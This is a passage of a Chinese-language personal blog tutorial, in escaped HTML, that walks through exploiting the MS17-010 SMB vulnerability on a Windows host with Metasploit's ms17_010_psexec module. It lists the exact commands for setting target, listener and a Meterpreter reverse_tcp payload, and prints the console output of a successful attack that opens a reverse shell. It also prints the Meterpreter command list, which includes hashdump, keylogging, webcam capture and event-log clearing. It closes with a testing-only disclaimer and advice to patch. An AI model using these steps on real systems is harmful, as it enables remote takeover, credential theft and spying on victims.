-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来msf5后面的模块就变成了攻击模块了。
-&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-07-26_23-01-45.png&#34; alt=&#34;&#34;&gt;
-然后继续执行info，没错，又会弹出一大堆。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit(windows/smb/ms17_010_psexec) &amp;gt; info
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对，就是下面这一大堆。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
-     Module: exploit/windows/smb/ms17_010_psexec
-   Platform: Windows
-       Arch: x86, x64
- Privileged: No
-    License: Metasploit Framework License (BSD)
-       Rank: Normal
-  Disclosed: 2017-03-14
-
-Provided by:
-  sleepya
-  zerosum0x0
-  Shadow Brokers
-  Equation Group
-
-Available targets:
-  Id  Name
-  --  ----
-  0   Automatic
-  1   PowerShell
-  2   Native upload
-  3   MOF upload
-
-Check supported:
-  Yes
-
-Basic options:
-  Name                  Current Setting                                 Required  Description
-  ----                  ---------------                                 --------  -----------
-  DBGTRACE              false                                           yes       Show extra debug trace info
-  LEAKATTEMPTS          99                                              yes       How many times to try to leak transaction
-  NAMEDPIPE                                                             no        A named pipe that can be connected to (leave blank for auto)
-  NAMED_PIPES           /opt/metasploit/data/wordlists/named_pipes.txt  yes       List of named pipes to check
-  RHOSTS                                                                yes       The target address range or CIDR identifier
-  RPORT                 445                                             yes       The Target port
-  SERVICE_DESCRIPTION                                                   no        Service description to to be used on target for pretty listing
-  SERVICE_DISPLAY_NAME                                                  no        The service display name
-  SERVICE_NAME                                                          no        The service name
-  SHARE                 ADMIN$                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
-  SMBDomain             .                                               no        The Windows domain to use for authentication
-  SMBPass                                                               no        The password for the specified username
-  SMBUser                                                               no        The username to authenticate as
-
-Payload information:
-  Space: 3072
-
-Description:
-  This module will exploit SMB with vulnerabilities in MS17-010 to 
-  achieve a write-what-where primitive. This will then be used to 
-  overwrite the connection session information with as an 
-  Administrator session. From there, the normal psexec payload code 
-  execution is done. Exploits a type confusion between Transaction and 
-  WriteAndX requests and a race condition in Transaction requests, as 
-  seen in the EternalRomance, EternalChampion, and EternalSynergy 
-  exploits. This exploit chain is more reliable than the EternalBlue 
-  exploit, but requires a named pipe.
-
-References:
-  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
-  https://cvedetails.com/cve/CVE-2017-0143/
-  https://cvedetails.com/cve/CVE-2017-0146/
-  https://cvedetails.com/cve/CVE-2017-0147/
-  https://github.com/worawit/MS17-010
-  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
-  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
-
-Also known as:
-  ETERNALSYNERGY
-  ETERNALROMANCE
-  ETERNALCHAMPION
-  ETERNALBLUE
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看到这么一大堆，你也不用紧张，其实跟上面的一样，你只需要设置四个东西&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;RHOST，目标IP，目标的DHCP地址&lt;/li&gt;
-&lt;li&gt;LHOST，监听IP，一般是你自己的DHCP地址&lt;/li&gt;
-&lt;li&gt;LPORT，监听端口，随便写一个，只要没冲突就行。比如我是Arch Linux，默认全端口关闭，我可以随便写。&lt;/li&gt;
-&lt;li&gt;payload，攻击载荷，一般是 windows/meterpreter/reverse_tcp ，你也可以用别的，想看看还有什么能用就执行 show payloads 吧。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;接下来就设置这四个东西吧。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit(windows/smb/ms17_010_psexec) &amp;gt; set LHOST 192.168.42.141
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit(windows/smb/ms17_010_psexec) &amp;gt; set LPORT &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;6666&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit(windows/smb/ms17_010_psexec) &amp;gt; set RHOST 192.168.42.252
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit(windows/smb/ms17_010_psexec) &amp;gt; set payloads windows/meterpreter/reverse_tcp
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;设置完以后执行 &lt;strong&gt;&lt;code&gt;run&lt;/code&gt;&lt;/strong&gt; 或者 &lt;strong&gt;&lt;code&gt;exploit&lt;/code&gt;&lt;/strong&gt; ，其实二者并没有什么区别，都是一样的。&lt;/p&gt;
-&lt;p&gt;喜欢哪个就用哪个吧。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit(windows/smb/ms17_010_psexec) &amp;gt; run
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;好啦，如果没有问题，然后返回一下内容，那么就说明攻击成功了。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;[*] Started reverse TCP handler on 192.168.42.141:6666 
-[*] 192.168.42.252:445 - Target OS: Windows 5.0
-[*] 192.168.42.252:445 - Filling barrel with fish... &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;done&lt;/span&gt;
-[*] 192.168.42.252:445 - &amp;lt;---------------- | Entering Danger Zone | ----------------&amp;gt;
-[*] 192.168.42.252:445 - 	[*] Preparing dynamite...
-[*] 192.168.42.252:445 - 		[*] Trying stick &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;1&lt;/span&gt; (x86)...Boom!
-[*] 192.168.42.252:445 - 	[+] Successfully Leaked Transaction!
-[*] 192.168.42.252:445 - 	[+] Successfully caught Fish-in-a-barrel
-[*] 192.168.42.252:445 - &amp;lt;---------------- | Leaving Danger Zone | ----------------&amp;gt;
-[*] 192.168.42.252:445 - Reading from CONNECTION struct at: 0x81382010
-[*] 192.168.42.252:445 - Built a write-what-where primitive...
-[+] 192.168.42.252:445 - Overwrite complete... SYSTEM session obtained!
-[*] 192.168.42.252:445 - Selecting native target
-[*] 192.168.42.252:445 - Uploading payload... JmgBrDpV.exe
-[*] 192.168.42.252:445 - Created &lt;span style=&#34;color:#0086d2&#34;&gt;\J&lt;/span&gt;mgBrDpV.exe...
-[+] 192.168.42.252:445 - Service started successfully...
-[*] 192.168.42.252:445 - Deleting &lt;span style=&#34;color:#0086d2&#34;&gt;\J&lt;/span&gt;mgBrDpV.exe...
-[*] Sending stage (&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;179779&lt;/span&gt; bytes) to 192.168.42.252
-[*] Meterpreter session &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;1&lt;/span&gt; opened (192.168.42.141:6666 -&amp;gt; 192.168.42.252:1027) at 2019-07-26 23:11:38 +0800
-
-meterpreter &amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;截一张图吧
-&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-07-26_23-12-50.png&#34; alt=&#34;&#34;&gt;
-接下来就可以进行你想干的事情了，而现在干的事情叫做后渗透。后渗透相当复杂，这里就不多讲了。&lt;/p&gt;
-&lt;p&gt;那么至少可以干点什么呢，执行&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;meterpreter &amp;gt; help
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;就可以看到帮助文档了。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Core Commands
-=============
-
-    Command                   Description
-    -------                   -----------
-    ?                         Help menu
-    background                Backgrounds the current session
-    bg                        Alias for background
-    bgkill                    Kills a background meterpreter script
-    bglist                    Lists running background scripts
-    bgrun                     Executes a meterpreter script as a background thread
-    channel                   Displays information or control active channels
-    close                     Closes a channel
-    disable_unicode_encoding  Disables encoding of unicode strings
-    enable_unicode_encoding   Enables encoding of unicode strings
-    exit                      Terminate the meterpreter session
-    get_timeouts              Get the current session timeout values
-    guid                      Get the session GUID
-    help                      Help menu
-    info                      Displays information about a Post module
-    irb                       Open an interactive Ruby shell on the current session
-    load                      Load one or more meterpreter extensions
-    machine_id                Get the MSF ID of the machine attached to the session
-    migrate                   Migrate the server to another process
-    pivot                     Manage pivot listeners
-    pry                       Open the Pry debugger on the current session
-    quit                      Terminate the meterpreter session
-    read                      Reads data from a channel
-    resource                  Run the commands stored in a file
-    run                       Executes a meterpreter script or Post module
-    sessions                  Quickly switch to another session
-    set_timeouts              Set the current session timeout values
-    sleep                     Force Meterpreter to go quiet, then re-establish session.
-    transport                 Change the current transport mechanism
-    use                       Deprecated alias for &amp;#34;load&amp;#34;
-    uuid                      Get the UUID for the current session
-    write                     Writes data to a channel
-
-
-Stdapi: File system Commands
-============================
-
-    Command       Description
-    -------       -----------
-    cat           Read the contents of a file to the screen
-    cd            Change directory
-    checksum      Retrieve the checksum of a file
-    cp            Copy source to destination
-    dir           List files (alias for ls)
-    download      Download a file or directory
-    edit          Edit a file
-    getlwd        Print local working directory
-    getwd         Print working directory
-    lcd           Change local working directory
-    lls           List local files
-    lpwd          Print local working directory
-    ls            List files
-    mkdir         Make directory
-    mv            Move source to destination
-    pwd           Print working directory
-    rm            Delete the specified file
-    rmdir         Remove directory
-    search        Search for files
-    show_mount    List all mount points/logical drives
-    upload        Upload a file or directory
-
-
-Stdapi: Networking Commands
-===========================
-
-    Command       Description
-    -------       -----------
-    arp           Display the host ARP cache
-    getproxy      Display the current proxy configuration
-    ifconfig      Display interfaces
-    ipconfig      Display interfaces
-    netstat       Display the network connections
-    portfwd       Forward a local port to a remote service
-    resolve       Resolve a set of host names on the target
-    route         View and modify the routing table
-
-
-Stdapi: System Commands
-=======================
-
-    Command       Description
-    -------       -----------
-    clearev       Clear the event log
-    drop_token    Relinquishes any active impersonation token.
-    execute       Execute a command
-    getenv        Get one or more environment variable values
-    getpid        Get the current process identifier
-    getprivs      Attempt to enable all privileges available to the current process
-    getsid        Get the SID of the user that the server is running as
-    getuid        Get the user that the server is running as
-    kill          Terminate a process
-    localtime     Displays the target system&amp;#39;s local date and time
-    pgrep         Filter processes by name
-    pkill         Terminate processes by name
-    ps            List running processes
-    reboot        Reboots the remote computer
-    reg           Modify and interact with the remote registry
-    rev2self      Calls RevertToSelf() on the remote machine
-    shell         Drop into a system command shell
-    shutdown      Shuts down the remote computer
-    steal_token   Attempts to steal an impersonation token from the target process
-    suspend       Suspends or resumes a list of processes
-    sysinfo       Gets information about the remote system, such as OS
-
-
-Stdapi: User interface Commands
-===============================
-
-    Command        Description
-    -------        -----------
-    enumdesktops   List all accessible desktops and window stations
-    getdesktop     Get the current meterpreter desktop
-    idletime       Returns the number of seconds the remote user has been idle
-    keyboard_send  Send keystrokes
-    keyscan_dump   Dump the keystroke buffer
-    keyscan_start  Start capturing keystrokes
-    keyscan_stop   Stop capturing keystrokes
-    mouse          Send mouse events
-    screenshot     Grab a screenshot of the interactive desktop
-    setdesktop     Change the meterpreters current desktop
-    uictl          Control some of the user interface components
-
-
-Stdapi: Webcam Commands
-=======================
-
-    Command        Description
-    -------        -----------
-    record_mic     Record audio from the default microphone for X seconds
-    webcam_chat    Start a video chat
-    webcam_list    List webcams
-    webcam_snap    Take a snapshot from the specified webcam
-    webcam_stream  Play a video stream from the specified webcam
-
-
-Stdapi: Audio Output Commands
-=============================
-
-    Command       Description
-    -------       -----------
-    play          play an audio file on target system, nothing written on disk
-
-
-Priv: Elevate Commands
-======================
-
-    Command       Description
-    -------       -----------
-    getsystem     Attempt to elevate your privilege to that of local system.
-
-
-Priv: Password database Commands
-================================
-
-    Command       Description
-    -------       -----------
-    hashdump      Dumps the contents of the SAM database
-
-
-Priv: Timestomp Commands
-========================
-
-    Command       Description
-    -------       -----------
-    timestomp     Manipulate file MACE attributes
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;嘛，返回来的很多是吧，这几个比较常用&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;&lt;code&gt;cd&lt;/code&gt;&lt;/strong&gt;、&lt;strong&gt;&lt;code&gt;ls&lt;/code&gt;&lt;/strong&gt;、&lt;strong&gt;&lt;code&gt;shell&lt;/code&gt;&lt;/strong&gt;、&lt;strong&gt;&lt;code&gt;cat&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;懂Linux的人基本上都知道了，这里不多做解释了。&lt;/p&gt;
-&lt;h2 id=&#34;小结&#34;&gt;小结&lt;/h2&gt;
-&lt;p&gt;首先本篇博客仅作为测试用途，请勿将其用于违法用途。&lt;/p&gt;
-&lt;p&gt;其次，ms17-010这类的漏洞都是十分危险的，Windows用户一定要注意及时更新，打好补丁，不要给坏人可乘之机，最好是干脆直接日用Linux，windows仅用于娱乐即可。&lt;/p&gt;
-&lt;p&gt;然后这篇博客也带有很多水的成分，谢谢浏览。&lt;/p&gt;
-- https://weepingdogel.github.io/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/ - 2019-2021 | WeepingDogel via CC-BY-NC 4.0</description>
         </item>
     
     
